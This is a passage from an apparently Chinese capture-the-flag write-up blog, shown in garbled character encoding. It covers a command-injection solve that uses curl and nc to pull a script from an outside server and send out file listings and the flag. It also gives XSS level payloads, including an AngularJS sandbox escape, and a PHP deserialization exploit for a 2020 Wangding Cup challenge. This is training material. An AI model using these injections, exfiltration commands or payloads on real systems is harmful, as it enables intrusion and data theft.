class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p><a href="https://zhuanlan.zhihu.com/p/138393396" target="_blank" rel="noopener">åå¼¹shellåŸç†ä¸å®ç°</a></p><p><a href="https://blog.csdn.net/xysoul/article/details/52270149" target="_blank" rel="noopener">ncå·¥å…·çš„ä½¿ç”¨</a></p><h3 id="æ€è·¯ï¼š-5"><a href="#æ€è·¯ï¼š-5" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h3><p>åˆ©ç”¨curlå‘½ä»¤æ¥å†™å…¥æœ¨é©¬</p><p>åˆ©ç”¨å·²æœ‰çš„æœåŠ¡å™¨ï¼Œå…ˆç¼–å†™è„šæœ¬ï¼Œç„¶åå†å®¢æˆ·ç«¯å°†æœ¨é©¬å¯¼å…¥ï¼Œå†ç”¨è¯¥æœåŠ¡å™¨å¯¹å“åº”çš„ç«¯å£è¿›è¡Œç›‘å¬ï¼Œæ¥è·å–è¿”å›å€¼</p><h3 id="è§£é¢˜ï¼š-7"><a href="#è§£é¢˜ï¼š-7" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h3><p>åœ¨å¤–éƒ¨æœåŠ¡å™¨ç¼–å†™è„šæœ¬1.shï¼š</p><pre><code>ls / | nc [æœåŠ¡å™¨ipåœ°å€] 8089cat /FLAG | nc [æœåŠ¡å™¨ipåœ°å€] 8089</code></pre><p>payloadï¼š</p><pre><code>127.0.0.1%0acurl [æœåŠ¡å™¨ipåœ°å€]/1.sh &gt; /tmp/1.sh127.0.0.1%0achmod 777 -R /tmp/1.sh</code></pre><p>ç„¶ååœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œï¼š</p><pre><code>nc -lvp 8089</code></pre><p>å®¢æˆ·ç«¯è§¦å‘è„šæœ¬ï¼š</p><pre><code>127.0.0.1%0ash /tmp/1.sh </code></pre><p>è¿™æ—¶å€™å°±ä¼šåå¼¹å¾—åˆ°flag</p><h2 id="XSSé—¯å…³"><a href="#XSSé—¯å…³" class="headerlink" title="XSSé—¯å…³"></a>XSSé—¯å…³</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>level1?username=xss</p><p>æ„é€ payloadï¼š</p><pre><code>level1?username=&lt;img src=1 onerror=alert(1)&gt;</code></pre><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>æ’ä¸è¿›å»çš„åŸå› ï¼š</p><pre class="line-numbers language-php+html"><code class="language-php+html">        if(location.search == ""){            location.search = "?username=xss"        }        var username = '';        document.getElementById('ccc').innerHTML= "Welcome " + escape(username);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ å…¥çš„å‚æ•°è¢«escapeå‡½æ•°ç¼–ç äº†</p><h4 id="æ‰«ç›²ï¼š-2"><a href="#æ‰«ç›²ï¼š-2" class="headerlink" title="æ‰«ç›²ï¼š"></a>æ‰«ç›²ï¼š</h4><p>JavaScript escape() å‡½æ•°</p><p><a href="https://www.runoob.com/jsref/jsref-obj-global.html" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://www.runoob.com/images/up.gif" alt="å‡½æ•°å‚è€ƒæ‰‹å†Œ"> JavaScript å…¨å±€å‡½æ•°</a></p><hr><p>å®šä¹‰å’Œç”¨æ³•</p><p>escape() å‡½æ•°å¯å¯¹å­—ç¬¦ä¸²è¿›è¡Œç¼–ç ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æ‰€æœ‰çš„è®¡ç®—æœºä¸Šè¯»å–è¯¥å­—ç¬¦ä¸²ã€‚</p><p>è¯¥æ–¹æ³•ä¸ä¼šå¯¹ ASCII å­—æ¯å’Œæ•°å­—è¿›è¡Œç¼–ç ï¼Œä¹Ÿä¸ä¼šå¯¹ä¸‹é¢è¿™äº› ASCII æ ‡ç‚¹ç¬¦å·è¿›è¡Œç¼–ç ï¼š * @ - _ + . / ã€‚å…¶ä»–æ‰€æœ‰çš„å­—ç¬¦éƒ½ä¼šè¢«è½¬ä¹‰åºåˆ—æ›¿æ¢ã€‚</p><p><strong>æç¤ºï¼š</strong> ä½¿ç”¨ <a href="https://www.runoob.com/jsref/jsref-unescape.html" target="_blank" rel="noopener">unescape()</a> æ–¹æ³•å¯¹å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚</p><h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass:"></a>bypass:</h4><pre><code>level2?username&#39;;alert(1);//</code></pre><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>bypass:</p><pre><code>&lt;img src=1 onerror=alert(1)&gt;</code></pre><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>æœ¬åœ°ç‰¹è‰²ï¼š</p><pre class="line-numbers language-html"><code class="language-html"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> time <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> jumpUrl<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'jumpUrl'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            jumpUrl <span class="token operator">=</span> location<span class="token punctuation">.</span>href<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            jumpUrl <span class="token operator">=</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'jumpUrl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span>jump<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">jump</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>time <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                location<span class="token punctuation">.</span>href <span class="token operator">=</span> jumpUrl<span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                time <span class="token operator">=</span> time <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token template-string"><span class="token string">`é¡µé¢</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>time<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">ç§’åå°†ä¼šé‡å®šå‘åˆ°</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">escape</span><span class="token punctuation">(</span>jumpUrl<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>                <span class="token function">setTimeout</span><span class="token punctuation">(</span>jump<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span>variable<span class="token punctuation">)</span>        <span class="token punctuation">{</span>               <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                       <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>               <span class="token punctuation">}</span>               <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨location.herf=jumpurlæ¥å®ç°ä¸€ä¸ªé‡å®šå‘</p><p>æ„é€ payloadï¼š</p><pre><code>?jumpUrl=javascript:alert(1);</code></pre><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><pre class="line-numbers language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'autosubmit'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> autoForm <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'autoForm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            autoForm<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token operator">?</span> location<span class="token punctuation">.</span>href <span class="token punctuation">:</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            autoForm<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span>variable<span class="token punctuation">)</span>        <span class="token punctuation">{</span>               <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                       <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>               <span class="token punctuation">}</span>               <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¿è¯autosubmitå’Œactionæœ‰å‚æ•°ï¼Œç„¶åautoFormçš„å‚æ•°å°†ä¼šè¢«æ‰§è¡Œ</p><p>bypassï¼š</p><pre><code>?autosubmit=1&amp;action=javascript:alert(1);</code></pre><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>javascriptæ¡†æ¶ï¼šangularjs1.4.6</p><p>é¦–å…ˆå‚è€ƒä¸‹é¢è¿™ä¸ªç½‘é¡µï¼š<br>AngularJSå®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆXSSï¼‰<br>çœ‹å®Œåå°±æ˜¯æ¨¡æ¿æ³¨å…¥XSSæœ‰äº†äº†è§£ï¼Œä¸è¿‡ç”±äºæˆ‘ä»¬çš„Angularç‰ˆæœ¬æ˜¯1.4.6ï¼Œå­˜åœ¨æ²™ç®±ï¼Œå› æ­¤è¦å»æœç´¢è¿™ä¸ªç‰ˆæœ¬çš„Angularçš„æ²™ç®±é€ƒé€¸çš„æ–¹æ³•ï¼š<br>AngularJS Sandbox Bypasses<br>ä»ä¸­å¾—çŸ¥çš„é€ƒé€¸çš„åŠæ³•ï¼š</p><pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</code></pre><p>åé¢çš„alert(1)é‚£é‡Œå¯ä»¥æ¢æˆä»»æ„jså‡½æ•°ã€‚ä¸è¿‡è¿™é¢˜æˆ‘ä»¬ä¸éœ€è¦ï¼Œç›´æ¥æ„é€ å°±å¯ä»¥äº†ï¼š</p><pre><code>?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</code></pre><h2 id="2020-ç½‘é¼æ¯-é’é¾™ç»„-Web-AreUSerialz"><a href="#2020-ç½‘é¼æ¯-é’é¾™ç»„-Web-AreUSerialz" class="headerlink" title="2020-ç½‘é¼æ¯-é’é¾™ç»„-Web-AreUSerialz"></a>2020-ç½‘é¼æ¯-é’é¾™ç»„-Web-AreUSerialz</h2><p>é¢˜ç›®ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">{</span><span class="token string">'str'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç¬¬ä¸€å±‚bypassï¼š"><a href="#ç¬¬ä¸€å±‚bypassï¼š" class="headerlink" title="ç¬¬ä¸€å±‚bypassï¼š"></a>ç¬¬ä¸€å±‚bypassï¼š</h3><p>åˆ©ç”¨php7.1çš„ç‰¹æ€§å¯¹ç”±protectedååºåˆ—åŒ–äº§ç”Ÿçš„ç‰¹æ®Šå­—ç¬¦å¯¼è‡´æ— æ³•ç»•è¿‡ordå‡½æ•°æ¥è¿›è¡Œç»•è¿‡ï¼šä¿®æ”¹æˆå‘˜çš„å±æ€§ä¸ºpublic</p><h3 id="ç¬¬äºŒå±‚bypassï¼š"><a href="#ç¬¬äºŒå±‚bypassï¼š" class="headerlink" title="ç¬¬äºŒå±‚bypassï¼š"></a>ç¬¬äºŒå±‚bypassï¼š</h3><p>ç”±äºwrite()å‡½æ•°åœ¨é€»è¾‘ä¸Šä¸€ç‚¹ç”¨æ²¡æœ‰ï¼Œæ‰€ä»¥æƒ³è¦å®ç°file_get_contentså‡½æ•°çš„è°ƒç”¨å°±å¿…é¡»ä½¿ç”¨readå‡½æ•°ï¼Œæ‰€ä»¥åˆ©ç”¨===ä¸==å¼ºå¼±ç±»å‹bypassï¼š$op=2;</p><p>æœ€åçš„å‚æ•°èµ‹å€¼ä¸ºflag.php</p><p>expï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—ï¼š</p><pre><code>?str=O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A7%3A%22content%22%3BN%3B%7D</code></pre><p>å³é”®æºä»£ç æŸ¥çœ‹flag</p><h2 id="2020-ç½‘é¼æ¯-æœ±é›€ç»„-Web-nmap"><a href="#2020-ç½‘é¼æ¯-æœ±é›€ç»„-Web-nmap" class="headerlink" 